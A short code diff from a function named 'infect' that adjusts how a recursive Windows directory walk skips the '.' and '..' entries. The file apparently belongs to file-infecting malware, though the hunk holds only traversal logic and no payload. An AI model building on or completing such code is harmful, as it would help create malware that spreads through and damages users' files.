@@ -213,7 +213,7 @@ int infect(void)
             char dot[] = {'.', 0};
             char dotDot[] = {'.', '.', 0};
 
-            if (strnicmp(find_data.cFileName, dot, 1) == 0 || strnicmp(find_data.cFileName, dotDot, 2) == 0)
+            if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
                continue;
             
             char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
